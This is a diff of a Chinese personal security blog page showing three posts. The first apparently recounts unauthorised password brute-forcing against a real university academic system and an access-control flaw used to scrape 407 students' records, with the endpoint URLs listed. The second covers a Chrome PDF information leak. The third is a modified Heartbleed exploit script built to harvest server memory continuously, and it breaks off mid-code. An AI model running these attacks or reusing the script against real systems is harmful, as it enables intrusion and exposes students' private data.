@@ -2,43 +2,53 @@
 
 
 <html lang="zh-CN">
-
-
-<head>
-  <meta charset="utf-8" />
-    
-  <meta name="description" content="GuoKer&#39;Blog | o0o0.club | 一个小站，记录自己。分享一些有趣的东西，虽然不一定有人看。(*^__^*) 嘻嘻……" />
   
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-  <title>
-     GuoKer&#39;Blog | o0o0.club | 一个小站，记录自己。分享一些有趣的东西，虽然不一定有人看。(*^__^*) 嘻嘻……
-  </title>
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta name="description" content="GuoKer&#39;Blog | o0o0.club | 一个小站，记录自己。分享一些有趣的东西，虽然不一定有人看。(*^__^*) 嘻嘻……" />
+      
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title> Guoker&#39;s Blog</title>
   <meta name="generator" content="hexo-theme-ayer">
-  
-  <link rel="shortcut icon" href="https://photo.o0o0.club/g.ico" />
-  
-  
+      
+      <link rel="shortcut icon" href="https://photo.o0o0.club/g.ico" />
+       
 <link rel="stylesheet" href="/dist/main.css">
 
-  
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
-
-  
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css"
+      />
+      
 <link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+       
+ 
 
-  
-  
-<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
 
-  
-  
-
-  
-
-<link rel="alternate" href="/atom.xml" title="Guoker's Blog" type="application/atom+xml">
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    <link rel="alternate" href="/atom.xml" title="Guoker's Blog" type="application/atom+xml">
 </head>
-
+  </html>
 </html>
+
 
 <body>
   <div id="app">
@@ -96,6 +106,50 @@
   
 <div id="main">
   <section class="outer">
+  
+  
+  
+
+<div class="notice" style="margin-top:50px">
+    <i class="ri-heart-fill"></i>
+    <div class="notice-content" id="broad"></div>
+</div>
+<script type="text/javascript">
+    fetch('https://v1.hitokoto.cn')
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById("broad").innerHTML = data.hitokoto;
+        })
+        .catch(console.error)
+</script>
+
+<style>
+    .notice {
+        padding: 20px;
+        border: 1px dashed #e6e6e6;
+        color: #969696;
+        position: relative;
+        display: inline-block;
+        width: 100%;
+        background: #fbfbfb50;
+        border-radius: 10px;
+    }
+
+    .notice i {
+        float: left;
+        color: #999;
+        font-size: 16px;
+        padding-right: 10px;
+        vertical-align: middle;
+        margin-top: -2px;
+    }
+
+    .notice-content {
+        display: initial;
+        vertical-align: middle;
+    }
+</style>
+  
   <article class="articles">
     
     
@@ -118,6 +172,7 @@
 </h2>
  
 
+      
     </header>
      
     <div class="article-meta">
@@ -125,7 +180,29 @@
   <time datetime="2019-03-14T16:00:00.000Z" itemprop="datePublished">2019-03-15</time>
 </a>    
     </div>
+      
+    <div class="article-entry" itemprop="articleBody">
        
+  <h1 id="一、绕过验证码登陆"><a href="#一、绕过验证码登陆" class="headerlink" title="一、绕过验证码登陆"></a>一、绕过验证码登陆</h1><p>教务系统登陆界面存在验证码登陆能有效增加攻击者枚举学生教务系统密码成本，但app接口并未作验证码验证且不记录错误次数，因此可以批量对同学们的教务密码进行枚举</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://jw.nnxy.cn/app.do?method=authUser&amp;xh=学号&amp;pwd=密码</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1553874839293.jpg" alt="登陆成功返回token"><br>（登陆成功返回token）<br>因此利用如下信息泄露检验学号是否存在，并使用top100password（弱口令排行前100的密码）进行检测（共407条学号）。</p>
+<p><img src="http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1553874872913.jpg" alt="共3名同学的密码为弱口令"></p>
+<h1 id="二、平行权限信息泄露"><a href="#二、平行权限信息泄露" class="headerlink" title="二、平行权限信息泄露"></a>二、平行权限信息泄露</h1><p>通过app接口登陆成功后会返回token，利用该token可以查询学生部分信息。</p>
+<p><img src="http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1553874881781.jpg" alt="enter description here"><br>但利用该token不仅可以查询本人部分信息（姓名、院系、班级、考生号等），同时修改xh参数为其他同学的学号也可以进行查询。<br>因此尝试获取20160111001-20160116050之间的同学信息。</p>
+<p><img src="http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1553874890594.jpg" alt="测试代码"></p>
+<p><img src="http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1553874898540.jpg" alt="共计爬取到407名同学的部分信息"></p>
+<p>附：</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">个人信息：http://jw.nnxy.<span class="keyword">cn</span>/app.<span class="keyword">do</span>?method=getUserInfo&amp;xh=<span class="number">20160116045</span></span><br><span class="line">课表查询：</span><br><span class="line">http://jw.nnxy.<span class="keyword">cn</span>/app.<span class="keyword">do</span>?method=getKbcxAzc&amp;xh=<span class="number">20160116045</span>&amp;xnxqid=<span class="number">2018</span>-<span class="number">2019</span>-<span class="number">1</span>&amp;zc=<span class="number">7</span></span><br><span class="line">成绩查询：</span><br><span class="line">http://jw.nnxy.<span class="keyword">cn</span>/app.<span class="keyword">do</span>?method=getCjcx&amp;xh=<span class="number">20160116045</span>&amp;xnxqid=<span class="number">2017</span>-<span class="number">2018</span>-<span class="number">2</span></span><br><span class="line">学生教评：http://jw.nnxy.<span class="keyword">cn</span>/app.<span class="keyword">do</span>?method=getPjpcList&amp;xh=<span class="number">20160116045</span></span><br><span class="line">学籍预警：</span><br><span class="line">http://jw.nnxy.<span class="keyword">cn</span>/app.<span class="keyword">do</span>?method=getEarlyWarnInfo&amp;xh=<span class="number">20160116045</span>&amp;<span class="keyword">history</span>=<span class="number">1</span></span><br><span class="line">考试查询：http://jw.nnxy.<span class="keyword">cn</span>/app.<span class="keyword">do</span>?method=getKscx&amp;xh=<span class="number">20160116045</span></span><br></pre></td></tr></table></figure>
+
+
+<p>均未对身份进行验证。<br>声明：对测试时抓取到的学生信息及数据，本人并未在任何平台公开发布、贩卖。</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
 
     <!-- copyright -->
     
@@ -138,7 +215,7 @@
 
     
  
-   
+    
 </article>
 
     
@@ -159,6 +236,7 @@
 </h2>
  
 
+      
     </header>
      
     <div class="article-meta">
@@ -166,7 +244,25 @@
   <time datetime="2019-02-28T16:00:00.000Z" itemprop="datePublished">2019-03-01</time>
 </a>    
     </div>
+      
+    <div class="article-entry" itemprop="articleBody">
        
+  <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前些天国外安全团队edgepot.it公开披露了Chrome浏览器通过打开pdf文件造成信息泄露的0day漏洞。一旦用户使用chrome浏览器查看精心构造的pdf文件，便会将用户设备数据回传给攻击者。</p>
+<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>根据在野利用的恶意PDF发现，造成该漏洞的根源在于chrome内置PDF阅读器未对  this.submitForm()这个Javascript API （Adobe中对该函数的定义是将表单提交到指定URL）的操作进行控制，从而导致漏洞利用。</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>通过调用this.submitForm(‘<a target="_blank" rel="noopener" href="http://baidu.com&/#39;)%E5%8D%B3%E5%8F%AF%E5%90%91%E4%BB%BB%E6%84%8FURL%E5%8F%91%E9%80%81%E6%95%B0%E6%8D%AE">http://baidu.com&#39;)即可向任意URL发送数据</a></p>
+<p><img src="http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1553875408476.jpg" alt="构造恶意代码"></p>
+<p><img src="http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1553875425444.jpg" alt="请求信息"></p>
+<p><img src="http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1553875449933.jpg" alt="接收信息"></p>
+<p>根据发送的数据可知该漏洞可泄露的信息如下：<br>1.用户ip<br>2.操作系统及Chrome版本号<br>3.PDF所在计算机的绝对路径路径</p>
+<h1 id="附加（内置PDF阅读器所支持的JavascriptAPI）"><a href="#附加（内置PDF阅读器所支持的JavascriptAPI）" class="headerlink" title="附加（内置PDF阅读器所支持的JavascriptAPI）"></a>附加（内置PDF阅读器所支持的JavascriptAPI）</h1><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app<span class="selector-class">.launchURL</span>()</span><br><span class="line">app<span class="selector-class">.media</span><span class="selector-class">.getURLdata</span>()</span><br><span class="line">app<span class="selector-class">.alert</span>()</span><br><span class="line">app<span class="selector-class">.execDialog</span>()</span><br><span class="line">doc<span class="selector-class">.getURL</span>()</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="安全建议："><a href="#安全建议：" class="headerlink" title="安全建议："></a>安全建议：</h1><p>虽然该漏洞不能直接造成代码执行，但在实际攻击中，有助于攻击者进一步获取目标信息，提高后续攻击的成功率（例如配合WinRAR的那个漏洞）目前补丁未出，建议暂时不要用chrome查看pdf，不打开来历不明的pdf文件。</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
 
     <!-- copyright -->
     
@@ -179,7 +275,7 @@
 
     
  
-   
+    
 </article>
 
     
@@ -200,6 +296,7 @@
 </h2>
  
 
+      
     </header>
      
     <div class="article-meta">
@@ -207,7 +304,19 @@
   <time datetime="2019-01-23T16:00:00.000Z" itemprop="datePublished">2019-01-24</time>
 </a>    
     </div>
+      
+    <div class="article-entry" itemprop="articleBody">
        
+  <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>继<a href="https://o0o0.club/2019/01/03/Heartbleed%E5%BF%83%E8%84%8F%E5%87%BA%E8%A1%80-%E5%BE%AA%E7%8E%AF%E6%90%9C%E9%9B%86%E8%84%9A%E6%9C%AC/">Heartbleed心脏出血-循环搜集脚本</a>后做了写调整。原先是在main里头做的循环，发现循环时间长了会导致错误。因此换到了hit_hb里头在调用hexdump之前做循环，并增加了异常处理（调用出现错误会强制等待5分钟）以及按照公司某位大佬的要求，添加了两个方法get_FileSize、file_judge用作获取文件大小（单位MB）判断是否大与设定值，新命名再将心跳响应写入。</p>
+<p><img src="https://i.loli.net/2019/01/24/5c496cc975210.jpg" alt="新增参数"></p>
+<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment"># Exploit Title: [OpenSSL TLS Heartbeat Extension - Memory Disclosure - Multiple SSL/TLS versions]</span></span><br><span class="line"><span class="comment"># Date: [2014-04-09]</span></span><br><span class="line"><span class="comment"># Exploit Author: [Csaba Fitzl]</span></span><br><span class="line"><span class="comment"># Vendor Homepage: [http://www.openssl.org/]</span></span><br><span class="line"><span class="comment"># Software Link: [http://www.openssl.org/source/openssl-1.0.1f.tar.gz]</span></span><br><span class="line"><span class="comment"># Version: [1.0.1f]</span></span><br><span class="line"><span class="comment"># Tested on: [N/A]</span></span><br><span class="line"><span class="comment"># CVE : [2014-0160]</span></span><br><span class="line"><span class="comment">#The second revision comes from Guoker</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)</span></span><br><span class="line"><span class="comment"># The author disclaims copyright to this source code.</span></span><br><span class="line"><span class="comment"># Modified by Csaba Fitzl for multiple SSL / TLS version support</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">-------------改动1-14--------------</span></span><br><span class="line"><span class="string">1.增加两个参数-t -d</span></span><br><span class="line"><span class="string">2.循环接收心跳响应</span></span><br><span class="line"><span class="string">3.接收到的响应保存至文档</span></span><br><span class="line"><span class="string">4.去除偏移地址和非ascii字符</span></span><br><span class="line"><span class="string">-------------改动1-23--------------</span></span><br><span class="line"><span class="string">1.增加get_FileSize方法用于获取文件大小</span></span><br><span class="line"><span class="string">2.增加file_judge方法用于判断文件大小</span></span><br><span class="line"><span class="string">3.增加两处异常处理：接收心跳响应错误、文件写入错误</span></span><br><span class="line"><span class="string">PS：文件大于10M时自动创建文件名+1后再写入</span></span><br><span class="line"><span class="string">如果写到out.txt88时手动退出了，下次启动要加上 -d out.txt88</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> select</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"></span><br><span class="line">options = OptionParser(usage=<span class="string">&#x27;%prog server [options]&#x27;</span>, description=<span class="string">&#x27;Test for SSL heartbeat vulnerability (CVE-2014-0160)&#x27;</span>)</span><br><span class="line">options.add_option(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;int&#x27;</span>, default=<span class="number">443</span>, <span class="built_in">help</span>=<span class="string">&#x27;TCP port to test (default: 443)&#x27;</span>)</span><br><span class="line">options.add_option(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--time&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;int&#x27;</span>, default=<span class="number">10</span>, <span class="built_in">help</span>=<span class="string">&#x27;Time to test (default: 10)&#x27;</span>)</span><br><span class="line">options.add_option(<span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;--dest&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;str&#x27;</span>, default=<span class="string">&#x27;out.txt&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Text output to test (default: out.txt)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">version = []</span><br><span class="line">version.append([<span class="string">&#x27;SSL 3.0&#x27;</span>,<span class="string">&#x27;03 00&#x27;</span>])</span><br><span class="line">version.append([<span class="string">&#x27;TLS 1.0&#x27;</span>,<span class="string">&#x27;03 01&#x27;</span>])</span><br><span class="line">version.append([<span class="string">&#x27;TLS 1.1&#x27;</span>,<span class="string">&#x27;03 02&#x27;</span>])</span><br><span class="line">version.append([<span class="string">&#x27;TLS 1.2&#x27;</span>,<span class="string">&#x27;03 03&#x27;</span>])</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">tmp_file = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">h2bin</span>(<span class="params">x</span>):</span></span><br><span class="line">	<span class="keyword">return</span> x.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_hello</span>(<span class="params">version</span>):</span></span><br><span class="line">	hello = h2bin(<span class="string">&#x27;16 &#x27;</span> + version + <span class="string">&#x27; 00 dc 01 00 00 d8 &#x27;</span> + version + <span class="string">&#x27;&#x27;&#x27; 53</span></span><br><span class="line"><span class="string">43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf</span></span><br><span class="line"><span class="string">bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00</span></span><br><span class="line"><span class="string">00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88</span></span><br><span class="line"><span class="string">00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c</span></span><br><span class="line"><span class="string">c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09</span></span><br><span class="line"><span class="string">c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44</span></span><br><span class="line"><span class="string">c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c</span></span><br><span class="line"><span class="string">c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11</span></span><br><span class="line"><span class="string">00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04</span></span><br><span class="line"><span class="string">03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19</span></span><br><span class="line"><span class="string">00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08</span></span><br><span class="line"><span class="string">00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13</span></span><br><span class="line"><span class="string">00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00</span></span><br><span class="line"><span class="string">00 0f 00 01 01</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">	<span class="keyword">return</span> hello</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_hb</span>(<span class="params">version</span>):</span></span><br><span class="line">	hb = h2bin(<span class="string">&#x27;18 &#x27;</span> + version + <span class="string">&#x27; 00 03 01 ff ff&#x27;</span>)</span><br><span class="line">	<span class="keyword">return</span> hb</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_FileSize</span>(<span class="params">filePath</span>):</span></span><br><span class="line">    filePath = unicode(filePath,<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    fsize = os.path.getsize(filePath)</span><br><span class="line">    fsize = fsize/<span class="built_in">float</span>(<span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">round</span>(fsize,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_judge</span>():</span></span><br><span class="line">	opts, args = options.parse_args()</span><br><span class="line">	<span class="keyword">global</span> i</span><br><span class="line">	<span class="keyword">global</span> tmp_file</span><br><span class="line">	<span class="keyword">if</span> get_FileSize(tmp_file) &gt; <span class="number">10</span>:</span><br><span class="line">		i += <span class="number">1</span></span><br><span class="line">		tmp_file = opts.dest + <span class="built_in">str</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexdump</span>(<span class="params">s</span>):</span></span><br><span class="line">    opts, args = options.parse_args()</span><br><span class="line">    pdat = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    times = time.strftime(<span class="string">&#x27;%Y-%m-%d-%H:%M:%S&#x27;</span>,time.localtime(time.time()))</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="built_in">len</span>(s), <span class="number">16</span>):</span><br><span class="line">        lin = [c <span class="keyword">for</span> c <span class="keyword">in</span> s[b : b + <span class="number">16</span>]]</span><br><span class="line">        pdat += <span class="string">&#x27;&#x27;</span>.join((c <span class="keyword">if</span> <span class="number">32</span> &lt;= <span class="built_in">ord</span>(c) &lt;= <span class="number">126</span> <span class="keyword">else</span> <span class="string">&#x27;.&#x27;</span> )<span class="keyword">for</span> c <span class="keyword">in</span> lin)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;%s&#x27;</span> % (pdat.replace(<span class="string">&#x27;......&#x27;</span>, <span class="string">&#x27;&#x27;</span>),)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;-----------------------&#x27;</span>+times+<span class="string">&#x27;---------------------------------&#x27;</span></span><br><span class="line"><span class="comment">#获取心跳内容后写入</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(tmp_file,<span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(<span class="string">&#x27;%s&#x27;</span> % (pdat.replace(<span class="string">&#x27;......&#x27;</span>, <span class="string">&#x27;&#x27;</span>),))</span><br><span class="line">            f.write(<span class="string">&#x27;-----------------------&#x27;</span>+times+<span class="string">&#x27;---------------------------------&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> :</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;error.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(<span class="string">&#x27;%s&#x27;</span> % (pdat.replace(<span class="string">&#x27;......&#x27;</span>, <span class="string">&#x27;&#x27;</span>),))</span><br><span class="line">            f.write(<span class="string">&#x27;-----------------------&#x27;</span>+times+<span class="string">&#x27;---------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recvall</span>(<span class="params">s, length, timeout=<span class="number">5</span></span>):</span></span><br><span class="line">	endtime = time.time() + timeout</span><br><span class="line">	rdata = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	remain = length</span><br><span class="line">	<span class="keyword">while</span> remain &gt; <span class="number">0</span>:</span><br><span class="line">		rtime = endtime - time.time()</span><br><span class="line">		<span class="keyword">if</span> rtime &lt; <span class="number">0</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">		r, w, e = select.select([s], [], [], <span class="number">5</span>)</span><br><span class="line">		<span class="keyword">if</span> s <span class="keyword">in</span> r:</span><br><span class="line">			data = s.recv(remain)</span><br><span class="line">			<span class="comment"># EOF?</span></span><br><span class="line">			<span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">			rdata += data</span><br><span class="line">			remain -= <span class="built_in">len</span>(data)</span><br><span class="line">	<span class="keyword">return</span> rdata</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delay</span>(<span class="params"><span class="built_in">int</span></span>):</span><span class="comment">#延迟方法</span></span><br><span class="line">    time.sleep(<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recvmsg</span>(<span class="params">s</span>):</span></span><br><span class="line">	hdr = recvall(s, <span class="number">5</span>)</span><br><span class="line">	<span class="keyword">if</span> hdr <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">		<span class="built_in">print</span> <span class="string">&#x27;Unexpected EOF receiving record header - server closed connection&#x27;</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">	typ, ver, ln = struct.unpack(<span class="string">&#x27;&gt;BHH&#x27;</span>, hdr)</span><br><span class="line">	pay = recvall(s, ln, <span class="number">10</span>)</span><br><span class="line">	<span class="keyword">if</span> pay <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">		<span class="built_in">print</span> <span class="string">&#x27;Unexpected EOF receiving record payload - server closed connection&#x27;</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">	<span class="built_in">print</span> <span class="string">&#x27; ... received message: type = %d, ver = %04x, length = %d&#x27;</span> % (typ, ver, <span class="built_in">len</span>(pay))</span><br><span class="line">	<span class="keyword">return</span> typ, ver, pay</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hit_hb</span>(<span class="params">s,hb</span>):</span></span><br><span class="line">	opts, args = options.parse_args()</span><br><span class="line">	s.send(hb)</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		typ, ver, pay = recvmsg(s)</span><br><span class="line">		<span class="keyword">if</span> typ <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">			<span class="built_in">print</span> <span 